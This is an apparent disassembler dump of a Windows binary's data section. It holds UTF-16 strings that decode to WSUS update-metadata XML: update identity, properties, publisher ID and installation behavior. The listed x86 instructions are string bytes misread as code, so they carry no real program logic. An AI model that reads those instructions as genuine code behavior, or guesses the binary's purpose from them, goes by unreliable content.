  406d61:	00 4e 00             	add    %cl,0x0(%esi)
  406d64:	27                   	daa
  406d65:	00 01                	add    %al,(%ecx)
  406d67:	82 df 3c             	sbb    $0x3c,%bh
  406d6a:	00 75 00             	add    %dh,0x0(%ebp)
  406d6d:	70 00                	jo     0x406d6f
  406d6f:	64 00 3a             	add    %bh,%fs:(%edx)
  406d72:	00 55 00             	add    %dl,0x0(%ebp)
  406d75:	70 00                	jo     0x406d77
  406d77:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  406d7b:	74 00                	je     0x406d7d
  406d7d:	65 00 20             	add    %ah,%gs:(%eax)
  406d80:	00 78 00             	add    %bh,0x0(%eax)
  406d83:	6d                   	insl   (%dx),%es:(%edi)
  406d84:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  406d88:	00 73 00             	add    %dh,0x0(%ebx)
  406d8b:	3a 00                	cmp    (%eax),%al
  406d8d:	62 00                	bound  %eax,(%eax)
  406d8f:	3d 00 22 00 68       	cmp    $0x68002200,%eax
  406d94:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  406d98:	00 70 00             	add    %dh,0x0(%eax)
  406d9b:	3a 00                	cmp    (%eax),%al
  406d9d:	2f                   	das
  406d9e:	00 2f                	add    %ch,(%edi)
  406da0:	00 73 00             	add    %dh,0x0(%ebx)
  406da3:	63 00                	arpl   %eax,(%eax)
  406da5:	68 00 65 00 6d       	push   $0x6d006500
  406daa:	00 61 00             	add    %ah,0x0(%ecx)
  406dad:	73 00                	jae    0x406daf
  406daf:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  406db3:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  406db9:	6f                   	outsl  %ds:(%esi),(%dx)
  406dba:	00 73 00             	add    %dh,0x0(%ebx)
  406dbd:	6f                   	outsl  %ds:(%esi),(%dx)
  406dbe:	00 66 00             	add    %ah,0x0(%esi)
  406dc1:	74 00                	je     0x406dc3
  406dc3:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406dc7:	6f                   	outsl  %ds:(%esi),(%dx)
  406dc8:	00 6d 00             	add    %ch,0x0(%ebp)
  406dcb:	2f                   	das
  406dcc:	00 6d 00             	add    %ch,0x0(%ebp)
  406dcf:	73 00                	jae    0x406dd1
  406dd1:	75 00                	jne    0x406dd3
  406dd3:	73 00                	jae    0x406dd5
  406dd5:	2f                   	das
  406dd6:	00 32                	add    %dh,(%edx)
  406dd8:	00 30                	add    %dh,(%eax)
  406dda:	00 30                	add    %dh,(%eax)
  406ddc:	00 32                	add    %dh,(%edx)
  406dde:	00 2f                	add    %ch,(%edi)
  406de0:	00 31                	add    %dh,(%ecx)
  406de2:	00 32                	add    %dh,(%edx)
  406de4:	00 2f                	add    %ch,(%edi)
  406de6:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  406dea:	00 67 00             	add    %ah,0x0(%edi)
  406ded:	69 00 63 00 61 00    	imul   $0x610063,(%eax),%eax
  406df3:	6c                   	insb   (%dx),%es:(%edi)
  406df4:	00 41 00             	add    %al,0x0(%ecx)
  406df7:	70 00                	jo     0x406df9
  406df9:	70 00                	jo     0x406dfb
  406dfb:	6c                   	insb   (%dx),%es:(%edi)
  406dfc:	00 69 00             	add    %ch,0x0(%ecx)
  406dff:	63 00                	arpl   %eax,(%eax)
  406e01:	61                   	popa
  406e02:	00 62 00             	add    %ah,0x0(%edx)
  406e05:	69 00 6c 00 69 00    	imul   $0x69006c,(%eax),%eax
  406e0b:	74 00                	je     0x406e0d
  406e0d:	79 00                	jns    0x406e0f
  406e0f:	52                   	push   %edx
  406e10:	00 75 00             	add    %dh,0x0(%ebp)
  406e13:	6c                   	insb   (%dx),%es:(%edi)
  406e14:	00 65 00             	add    %ah,0x0(%ebp)
  406e17:	73 00                	jae    0x406e19
  406e19:	22 00                	and    (%eax),%al
  406e1b:	20 00                	and    %al,(%eax)
  406e1d:	78 00                	js     0x406e1f
  406e1f:	6d                   	insl   (%dx),%es:(%edi)
  406e20:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  406e24:	00 73 00             	add    %dh,0x0(%ebx)
  406e27:	3a 00                	cmp    (%eax),%al
  406e29:	70 00                	jo     0x406e2b
  406e2b:	75 00                	jne    0x406e2d
  406e2d:	62 00                	bound  %eax,(%eax)
  406e2f:	3d 00 22 00 68       	cmp    $0x68002200,%eax
  406e34:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  406e38:	00 70 00             	add    %dh,0x0(%eax)
  406e3b:	3a 00                	cmp    (%eax),%al
  406e3d:	2f                   	das
  406e3e:	00 2f                	add    %ch,(%edi)
  406e40:	00 73 00             	add    %dh,0x0(%ebx)
  406e43:	63 00                	arpl   %eax,(%eax)
  406e45:	68 00 65 00 6d       	push   $0x6d006500
  406e4a:	00 61 00             	add    %ah,0x0(%ecx)
  406e4d:	73 00                	jae    0x406e4f
  406e4f:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  406e53:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  406e59:	6f                   	outsl  %ds:(%esi),(%dx)
  406e5a:	00 73 00             	add    %dh,0x0(%ebx)
  406e5d:	6f                   	outsl  %ds:(%esi),(%dx)
  406e5e:	00 66 00             	add    %ah,0x0(%esi)
  406e61:	74 00                	je     0x406e63
  406e63:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406e67:	6f                   	outsl  %ds:(%esi),(%dx)
  406e68:	00 6d 00             	add    %ch,0x0(%ebp)
  406e6b:	2f                   	das
  406e6c:	00 6d 00             	add    %ch,0x0(%ebp)
  406e6f:	73 00                	jae    0x406e71
  406e71:	75 00                	jne    0x406e73
  406e73:	73 00                	jae    0x406e75
  406e75:	2f                   	das
  406e76:	00 32                	add    %dh,(%edx)
  406e78:	00 30                	add    %dh,(%eax)
  406e7a:	00 30                	add    %dh,(%eax)
  406e7c:	00 32                	add    %dh,(%edx)
  406e7e:	00 2f                	add    %ch,(%edi)
  406e80:	00 31                	add    %dh,(%ecx)
  406e82:	00 32                	add    %dh,(%edx)
  406e84:	00 2f                	add    %ch,(%edi)
  406e86:	00 50 00             	add    %dl,0x0(%eax)
  406e89:	75 00                	jne    0x406e8b
  406e8b:	62 00                	bound  %eax,(%eax)
  406e8d:	6c                   	insb   (%dx),%es:(%edi)
  406e8e:	00 69 00             	add    %ch,0x0(%ecx)
  406e91:	73 00                	jae    0x406e93
  406e93:	68 00 69 00 6e       	push   $0x6e006900
  406e98:	00 67 00             	add    %ah,0x0(%edi)
  406e9b:	22 00                	and    (%eax),%al
  406e9d:	20 00                	and    %al,(%eax)
  406e9f:	78 00                	js     0x406ea1
  406ea1:	6d                   	insl   (%dx),%es:(%edi)
  406ea2:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  406ea6:	00 73 00             	add    %dh,0x0(%ebx)
  406ea9:	3a 00                	cmp    (%eax),%al
  406eab:	63 00                	arpl   %eax,(%eax)
  406ead:	62 00                	bound  %eax,(%eax)
  406eaf:	73 00                	jae    0x406eb1
  406eb1:	3d 00 22 00 68       	cmp    $0x68002200,%eax
  406eb6:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  406eba:	00 70 00             	add    %dh,0x0(%eax)
  406ebd:	3a 00                	cmp    (%eax),%al
  406ebf:	2f                   	das
  406ec0:	00 2f                	add    %ch,(%edi)
  406ec2:	00 73 00             	add    %dh,0x0(%ebx)
  406ec5:	63 00                	arpl   %eax,(%eax)
  406ec7:	68 00 65 00 6d       	push   $0x6d006500
  406ecc:	00 61 00             	add    %ah,0x0(%ecx)
  406ecf:	73 00                	jae    0x406ed1
  406ed1:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  406ed5:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  406edb:	6f                   	outsl  %ds:(%esi),(%dx)
  406edc:	00 73 00             	add    %dh,0x0(%ebx)
  406edf:	6f                   	outsl  %ds:(%esi),(%dx)
  406ee0:	00 66 00             	add    %ah,0x0(%esi)
  406ee3:	74 00                	je     0x406ee5
  406ee5:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406ee9:	6f                   	outsl  %ds:(%esi),(%dx)
  406eea:	00 6d 00             	add    %ch,0x0(%ebp)
  406eed:	2f                   	das
  406eee:	00 6d 00             	add    %ch,0x0(%ebp)
  406ef1:	73 00                	jae    0x406ef3
  406ef3:	75 00                	jne    0x406ef5
  406ef5:	73 00                	jae    0x406ef7
  406ef7:	2f                   	das
  406ef8:	00 32                	add    %dh,(%edx)
  406efa:	00 30                	add    %dh,(%eax)
  406efc:	00 30                	add    %dh,(%eax)
  406efe:	00 32                	add    %dh,(%edx)
  406f00:	00 2f                	add    %ch,(%edi)
  406f02:	00 31                	add    %dh,(%ecx)
  406f04:	00 32                	add    %dh,(%edx)
  406f06:	00 2f                	add    %ch,(%edi)
  406f08:	00 55 00             	add    %dl,0x0(%ebp)
  406f0b:	70 00                	jo     0x406f0d
  406f0d:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  406f11:	74 00                	je     0x406f13
  406f13:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  406f17:	61                   	popa
  406f18:	00 6e 00             	add    %ch,0x0(%esi)
  406f1b:	64 00 6c 00 65       	add    %ch,%fs:0x65(%eax,%eax,1)
  406f20:	00 72 00             	add    %dh,0x0(%edx)
  406f23:	73 00                	jae    0x406f25
  406f25:	2f                   	das
  406f26:	00 43 00             	add    %al,0x0(%ebx)
  406f29:	62 00                	bound  %eax,(%eax)
  406f2b:	73 00                	jae    0x406f2d
  406f2d:	22 00                	and    (%eax),%al
  406f2f:	20 00                	and    %al,(%eax)
  406f31:	78 00                	js     0x406f33
  406f33:	6d                   	insl   (%dx),%es:(%edi)
  406f34:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  406f38:	00 73 00             	add    %dh,0x0(%ebx)
  406f3b:	3a 00                	cmp    (%eax),%al
  406f3d:	63 00                	arpl   %eax,(%eax)
  406f3f:	62 00                	bound  %eax,(%eax)
  406f41:	73 00                	jae    0x406f43
  406f43:	61                   	popa
  406f44:	00 72 00             	add    %dh,0x0(%edx)
  406f47:	3d 00 22 00 68       	cmp    $0x68002200,%eax
  406f4c:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  406f50:	00 70 00             	add    %dh,0x0(%eax)
  406f53:	3a 00                	cmp    (%eax),%al
  406f55:	2f                   	das
  406f56:	00 2f                	add    %ch,(%edi)
  406f58:	00 73 00             	add    %dh,0x0(%ebx)
  406f5b:	63 00                	arpl   %eax,(%eax)
  406f5d:	68 00 65 00 6d       	push   $0x6d006500
  406f62:	00 61 00             	add    %ah,0x0(%ecx)
  406f65:	73 00                	jae    0x406f67
  406f67:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  406f6b:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  406f71:	6f                   	outsl  %ds:(%esi),(%dx)
  406f72:	00 73 00             	add    %dh,0x0(%ebx)
  406f75:	6f                   	outsl  %ds:(%esi),(%dx)
  406f76:	00 66 00             	add    %ah,0x0(%esi)
  406f79:	74 00                	je     0x406f7b
  406f7b:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406f7f:	6f                   	outsl  %ds:(%esi),(%dx)
  406f80:	00 6d 00             	add    %ch,0x0(%ebp)
  406f83:	2f                   	das
  406f84:	00 6d 00             	add    %ch,0x0(%ebp)
  406f87:	73 00                	jae    0x406f89
  406f89:	75 00                	jne    0x406f8b
  406f8b:	73 00                	jae    0x406f8d
  406f8d:	2f                   	das
  406f8e:	00 32                	add    %dh,(%edx)
  406f90:	00 30                	add    %dh,(%eax)
  406f92:	00 30                	add    %dh,(%eax)
  406f94:	00 32                	add    %dh,(%edx)
  406f96:	00 2f                	add    %ch,(%edi)
  406f98:	00 31                	add    %dh,(%ecx)
  406f9a:	00 32                	add    %dh,(%edx)
  406f9c:	00 2f                	add    %ch,(%edi)
  406f9e:	00 43 00             	add    %al,0x0(%ebx)
  406fa1:	62 00                	bound  %eax,(%eax)
  406fa3:	73 00                	jae    0x406fa5
  406fa5:	41                   	inc    %ecx
  406fa6:	00 70 00             	add    %dh,0x0(%eax)
  406fa9:	70 00                	jo     0x406fab
  406fab:	6c                   	insb   (%dx),%es:(%edi)
  406fac:	00 69 00             	add    %ch,0x0(%ecx)
  406faf:	63 00                	arpl   %eax,(%eax)
  406fb1:	61                   	popa
  406fb2:	00 62 00             	add    %ah,0x0(%edx)
  406fb5:	69 00 6c 00 69 00    	imul   $0x69006c,(%eax),%eax
  406fbb:	74 00                	je     0x406fbd
  406fbd:	79 00                	jns    0x406fbf
  406fbf:	52                   	push   %edx
  406fc0:	00 75 00             	add    %dh,0x0(%ebp)
  406fc3:	6c                   	insb   (%dx),%es:(%edi)
  406fc4:	00 65 00             	add    %ah,0x0(%ebp)
  406fc7:	73 00                	jae    0x406fc9
  406fc9:	22 00                	and    (%eax),%al
  406fcb:	20 00                	and    %al,(%eax)
  406fcd:	78 00                	js     0x406fcf
  406fcf:	6d                   	insl   (%dx),%es:(%edi)
  406fd0:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  406fd4:	00 73 00             	add    %dh,0x0(%ebx)
  406fd7:	3a 00                	cmp    (%eax),%al
  406fd9:	75 00                	jne    0x406fdb
  406fdb:	70 00                	jo     0x406fdd
  406fdd:	64 00 3d 00 22 00 68 	add    %bh,%fs:0x68002200
  406fe4:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  406fe8:	00 70 00             	add    %dh,0x0(%eax)
  406feb:	3a 00                	cmp    (%eax),%al
  406fed:	2f                   	das
  406fee:	00 2f                	add    %ch,(%edi)
  406ff0:	00 73 00             	add    %dh,0x0(%ebx)
  406ff3:	63 00                	arpl   %eax,(%eax)
  406ff5:	68 00 65 00 6d       	push   $0x6d006500
  406ffa:	00 61 00             	add    %ah,0x0(%ecx)
  406ffd:	73 00                	jae    0x406fff
  406fff:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  407003:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  407009:	6f                   	outsl  %ds:(%esi),(%dx)
  40700a:	00 73 00             	add    %dh,0x0(%ebx)
  40700d:	6f                   	outsl  %ds:(%esi),(%dx)
  40700e:	00 66 00             	add    %ah,0x0(%esi)
  407011:	74 00                	je     0x407013
  407013:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  407017:	6f                   	outsl  %ds:(%esi),(%dx)
  407018:	00 6d 00             	add    %ch,0x0(%ebp)
  40701b:	2f                   	das
  40701c:	00 6d 00             	add    %ch,0x0(%ebp)
  40701f:	73 00                	jae    0x407021
  407021:	75 00                	jne    0x407023
  407023:	73 00                	jae    0x407025
  407025:	2f                   	das
  407026:	00 32                	add    %dh,(%edx)
  407028:	00 30                	add    %dh,(%eax)
  40702a:	00 30                	add    %dh,(%eax)
  40702c:	00 32                	add    %dh,(%edx)
  40702e:	00 2f                	add    %ch,(%edi)
  407030:	00 31                	add    %dh,(%ecx)
  407032:	00 32                	add    %dh,(%edx)
  407034:	00 2f                	add    %ch,(%edi)
  407036:	00 55 00             	add    %dl,0x0(%ebp)
  407039:	70 00                	jo     0x40703b
  40703b:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40703f:	74 00                	je     0x407041
  407041:	65 00 22             	add    %ah,%gs:(%edx)
  407044:	00 3e                	add    %bh,(%esi)
  407046:	00 00                	add    %al,(%eax)
  407048:	3f                   	aas
  407049:	09 00                	or     %eax,(%eax)
  40704b:	3c 00                	cmp    $0x0,%al
  40704d:	75 00                	jne    0x40704f
  40704f:	70 00                	jo     0x407051
  407051:	64 00 3a             	add    %bh,%fs:(%edx)
  407054:	00 55 00             	add    %dl,0x0(%ebp)
  407057:	70 00                	jo     0x407059
  407059:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40705d:	74 00                	je     0x40705f
  40705f:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  407063:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  407067:	6e                   	outsb  %ds:(%esi),(%dx)
  407068:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40706c:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  407070:	00 20                	add    %ah,(%eax)
  407072:	00 55 00             	add    %dl,0x0(%ebp)
  407075:	70 00                	jo     0x407077
  407077:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40707b:	74 00                	je     0x40707d
  40707d:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  407081:	44                   	inc    %esp
  407082:	00 3d 00 22 00 00    	add    %bh,0x2200
  407088:	33 22                	xor    (%edx),%esp
  40708a:	00 20                	add    %ah,(%eax)
  40708c:	00 52 00             	add    %dl,0x0(%edx)
  40708f:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  407093:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  407099:	6f                   	outsl  %ds:(%esi),(%dx)
  40709a:	00 6e 00             	add    %ch,0x0(%esi)
  40709d:	4e                   	dec    %esi
  40709e:	00 75 00             	add    %dh,0x0(%ebp)
  4070a1:	6d                   	insl   (%dx),%es:(%edi)
  4070a2:	00 62 00             	add    %ah,0x0(%edx)
  4070a5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4070a9:	3d 00 22 00 32       	cmp    $0x32002200,%eax
  4070ae:	00 30                	add    %dh,(%eax)
  4070b0:	00 32                	add    %dh,(%edx)
  4070b2:	00 22                	add    %ah,(%edx)
  4070b4:	00 20                	add    %ah,(%eax)
  4070b6:	00 2f                	add    %ch,(%edi)
  4070b8:	00 3e                	add    %bh,(%esi)
  4070ba:	00 00                	add    %al,(%eax)
  4070bc:	81 3d 09 00 3c 00 75 	cmpl   $0x700075,0x3c0009
  4070c3:	00 70 00 
  4070c6:	64 00 3a             	add    %bh,%fs:(%edx)
  4070c9:	00 50 00             	add    %dl,0x0(%eax)
  4070cc:	72 00                	jb     0x4070ce
  4070ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4070cf:	00 70 00             	add    %dh,0x0(%eax)
  4070d2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4070d6:	74 00                	je     0x4070d8
  4070d8:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4070de:	20 00                	and    %al,(%eax)
  4070e0:	44                   	inc    %esp
  4070e1:	00 65 00             	add    %ah,0x0(%ebp)
  4070e4:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4070e8:	75 00                	jne    0x4070ea
  4070ea:	6c                   	insb   (%dx),%es:(%edi)
  4070eb:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  4070ef:	00 72 00             	add    %dh,0x0(%edx)
  4070f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4070f3:	00 70 00             	add    %dh,0x0(%eax)
  4070f6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4070fa:	74 00                	je     0x4070fc
  4070fc:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  407102:	4c                   	dec    %esp
  407103:	00 61 00             	add    %ah,0x0(%ecx)
  407106:	6e                   	outsb  %ds:(%esi),(%dx)
  407107:	00 67 00             	add    %ah,0x0(%edi)
  40710a:	75 00                	jne    0x40710c
  40710c:	61                   	popa
  40710d:	00 67 00             	add    %ah,0x0(%edi)
  407110:	65 00 3d 00 22 00 65 	add    %bh,%gs:0x65002200
  407117:	00 6e 00             	add    %ch,0x0(%esi)
  40711a:	22 00                	and    (%eax),%al
  40711c:	20 00                	and    %al,(%eax)
  40711e:	55                   	push   %ebp
  40711f:	00 70 00             	add    %dh,0x0(%eax)
  407122:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  407126:	74 00                	je     0x407128
  407128:	65 00 54 00 79       	add    %dl,%gs:0x79(%eax,%eax,1)
  40712d:	00 70 00             	add    %dh,0x0(%eax)
  407130:	65 00 3d 00 22 00 53 	add    %bh,%gs:0x53002200
  407137:	00 6f 00             	add    %ch,0x0(%edi)
  40713a:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40713f:	00 61 00             	add    %ah,0x0(%ecx)
  407142:	72 00                	jb     0x407144
  407144:	65 00 22             	add    %ah,%gs:(%edx)
  407147:	00 20                	add    %ah,(%eax)
  407149:	00 48 00             	add    %cl,0x0(%eax)
  40714c:	61                   	popa
  40714d:	00 6e 00             	add    %ch,0x0(%esi)
  407150:	64 00 6c 00 65       	add    %ch,%fs:0x65(%eax,%eax,1)
  407155:	00 72 00             	add    %dh,0x0(%edx)
  407158:	3d 00 22 00 68       	cmp    $0x68002200,%eax
  40715d:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  407161:	00 70 00             	add    %dh,0x0(%eax)
  407164:	3a 00                	cmp    (%eax),%al
  407166:	2f                   	das
  407167:	00 2f                	add    %ch,(%edi)
  407169:	00 73 00             	add    %dh,0x0(%ebx)
  40716c:	63 00                	arpl   %eax,(%eax)
  40716e:	68 00 65 00 6d       	push   $0x6d006500
  407173:	00 61 00             	add    %ah,0x0(%ecx)
  407176:	73 00                	jae    0x407178
  407178:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  40717c:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  407182:	6f                   	outsl  %ds:(%esi),(%dx)
  407183:	00 73 00             	add    %dh,0x0(%ebx)
  407186:	6f                   	outsl  %ds:(%esi),(%dx)
  407187:	00 66 00             	add    %ah,0x0(%esi)
  40718a:	74 00                	je     0x40718c
  40718c:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  407190:	6f                   	outsl  %ds:(%esi),(%dx)
  407191:	00 6d 00             	add    %ch,0x0(%ebp)
  407194:	2f                   	das
  407195:	00 6d 00             	add    %ch,0x0(%ebp)
  407198:	73 00                	jae    0x40719a
  40719a:	75 00                	jne    0x40719c
  40719c:	73 00                	jae    0x40719e
  40719e:	2f                   	das
  40719f:	00 32                	add    %dh,(%edx)
  4071a1:	00 30                	add    %dh,(%eax)
  4071a3:	00 30                	add    %dh,(%eax)
  4071a5:	00 32                	add    %dh,(%edx)
  4071a7:	00 2f                	add    %ch,(%edi)
  4071a9:	00 31                	add    %dh,(%ecx)
  4071ab:	00 32                	add    %dh,(%edx)
  4071ad:	00 2f                	add    %ch,(%edi)
  4071af:	00 55 00             	add    %dl,0x0(%ebp)
  4071b2:	70 00                	jo     0x4071b4
  4071b4:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4071b8:	74 00                	je     0x4071ba
  4071ba:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  4071be:	61                   	popa
  4071bf:	00 6e 00             	add    %ch,0x0(%esi)
  4071c2:	64 00 6c 00 65       	add    %ch,%fs:0x65(%eax,%eax,1)
  4071c7:	00 72 00             	add    %dh,0x0(%edx)
  4071ca:	73 00                	jae    0x4071cc
  4071cc:	2f                   	das
  4071cd:	00 43 00             	add    %al,0x0(%ebx)
  4071d0:	62 00                	bound  %eax,(%eax)
  4071d2:	73 00                	jae    0x4071d4
  4071d4:	22 00                	and    (%eax),%al
  4071d6:	20 00                	and    %al,(%eax)
  4071d8:	4d                   	dec    %ebp
  4071d9:	00 61 00             	add    %ah,0x0(%ecx)
  4071dc:	78 00                	js     0x4071de
  4071de:	44                   	inc    %esp
  4071df:	00 6f 00             	add    %ch,0x0(%edi)
  4071e2:	77 00                	ja     0x4071e4
  4071e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4071e5:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  4071e9:	00 61 00             	add    %ah,0x0(%ecx)
  4071ec:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  4071f0:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  4071f6:	3d 00 22 00 00       	cmp    $0x2200,%eax
  4071fb:	27                   	daa
  4071fc:	22 00                	and    (%eax),%al
  4071fe:	20 00                	and    %al,(%eax)
  407200:	4d                   	dec    %ebp
  407201:	00 69 00             	add    %ch,0x0(%ecx)
  407204:	6e                   	outsb  %ds:(%esi),(%dx)
  407205:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  407209:	00 77 00             	add    %dh,0x0(%edi)
  40720c:	6e                   	outsb  %ds:(%esi),(%dx)
  40720d:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  407211:	00 61 00             	add    %ah,0x0(%ecx)
  407214:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  407218:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  40721e:	3d 00 22 00 00       	cmp    $0x2200,%eax
  407223:	5b                   	pop    %ebx
  407224:	22 00                	and    (%eax),%al
  407226:	20 00                	and    %al,(%eax)
  407228:	50                   	push   %eax
  407229:	00 75 00             	add    %dh,0x0(%ebp)
  40722c:	62 00                	bound  %eax,(%eax)
  40722e:	6c                   	insb   (%dx),%es:(%edi)
  40722f:	00 69 00             	add    %ch,0x0(%ecx)
  407232:	63 00                	arpl   %eax,(%eax)
  407234:	61                   	popa
  407235:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  407239:	00 6f 00             	add    %ch,0x0(%edi)
  40723c:	6e                   	outsb  %ds:(%esi),(%dx)
  40723d:	00 53 00             	add    %dl,0x0(%ebx)
  407240:	74 00                	je     0x407242
  407242:	61                   	popa
  407243:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  407247:	00 3d 00 22 00 50    	add    %bh,0x50002200
  40724d:	00 75 00             	add    %dh,0x0(%ebp)
  407250:	62 00                	bound  %eax,(%eax)
  407252:	6c                   	insb   (%dx),%es:(%edi)
  407253:	00 69 00             	add    %ch,0x0(%ecx)
  407256:	73 00                	jae    0x407258
  407258:	68 00 65 00 64       	push   $0x64006500
  40725d:	00 22                	add    %ah,(%edx)
  40725f:	00 20                	add    %ah,(%eax)
  407261:	00 43 00             	add    %al,0x0(%ebx)
  407264:	72 00                	jb     0x407266
  407266:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40726a:	74 00                	je     0x40726c
  40726c:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407272:	44                   	inc    %esp
  407273:	00 61 00             	add    %ah,0x0(%ecx)
  407276:	74 00                	je     0x407278
  407278:	65 00 3d 00 22 00 00 	add    %bh,%gs:0x2200
  40727f:	80 87 54 00 30 00 30 	addb   $0x30,0x300054(%edi)
  407286:	00 3a                	add    %bh,(%edx)
  407288:	00 30                	add    %dh,(%eax)
  40728a:	00 33                	add    %dh,(%ebx)
  40728c:	00 3a                	add    %bh,(%edx)
  40728e:	00 35 00 35 00 2e    	add    %dh,0x2e003500
  407294:	00 39                	add    %bh,(%ecx)
  407296:	00 31                	add    %dh,(%ecx)
  407298:	00 32                	add    %dh,(%edx)
  40729a:	00 5a 00             	add    %bl,0x0(%edx)
  40729d:	22 00                	and    (%eax),%al
  40729f:	20 00                	and    %al,(%eax)
  4072a1:	50                   	push   %eax
  4072a2:	00 75 00             	add    %dh,0x0(%ebp)
  4072a5:	62 00                	bound  %eax,(%eax)
  4072a7:	6c                   	insb   (%dx),%es:(%edi)
  4072a8:	00 69 00             	add    %ch,0x0(%ecx)
  4072ab:	73 00                	jae    0x4072ad
  4072ad:	68 00 65 00 72       	push   $0x72006500
  4072b2:	00 49 00             	add    %cl,0x0(%ecx)
  4072b5:	44                   	inc    %esp
  4072b6:	00 3d 00 22 00 33    	add    %bh,0x33002200
  4072bc:	00 39                	add    %bh,(%ecx)
  4072be:	00 35 00 33 00 39    	add    %dh,0x39003300
  4072c4:	00 32                	add    %dh,(%edx)
  4072c6:	00 61 00             	add    %ah,0x0(%ecx)
  4072c9:	30 00                	xor    %al,(%eax)
  4072cb:	2d 00 31 00 39       	sub    $0x39003100,%eax
  4072d0:	00 63 00             	add    %ah,0x0(%ebx)
  4072d3:	30 00                	xor    %al,(%eax)
  4072d5:	2d 00 34 00 38       	sub    $0x38003400,%eax
  4072da:	00 62 00             	add    %ah,0x0(%edx)
  4072dd:	37                   	aaa
  4072de:	00 2d 00 61 00 39    	add    %ch,0x39006100
  4072e4:	00 32                	add    %dh,(%edx)
  4072e6:	00 37                	add    %dh,(%edi)
  4072e8:	00 2d 00 66 00 37    	add    %ch,0x37006600
  4072ee:	00 63 00             	add    %ah,0x0(%ebx)
  4072f1:	31 00                	xor    %eax,(%eax)
  4072f3:	35 00 30 00 36       	xor    $0x36003000,%eax
  4072f8:	00 36                	add    %dh,(%esi)
  4072fa:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  4072fe:	00 30                	add    %dh,(%eax)
  407300:	00 35 00 22 00 3e    	add    %dh,0x3e002200
  407306:	00 01                	add    %al,(%ecx)
  407308:	80 81 09 00 09 00 3c 	addb   $0x3c,0x90009(%ecx)
  40730f:	00 75 00             	add    %dh,0x0(%ebp)
  407312:	70 00                	jo     0x407314
  407314:	64 00 3a             	add    %bh,%fs:(%edx)
  407317:	00 49 00             	add    %cl,0x0(%ecx)
  40731a:	6e                   	outsb  %ds:(%esi),(%dx)
  40731b:	00 73 00             	add    %dh,0x0(%ebx)
  40731e:	74 00                	je     0x407320
  407320:	61                   	popa
  407321:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  407325:	00 61 00             	add    %ah,0x0(%ecx)
  407328:	74 00                	je     0x40732a
  40732a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407330:	42                   	inc    %edx
  407331:	00 65 00             	add    %ah,0x0(%ebp)
  407334:	68 00 61 00 76       	push   $0x76006100
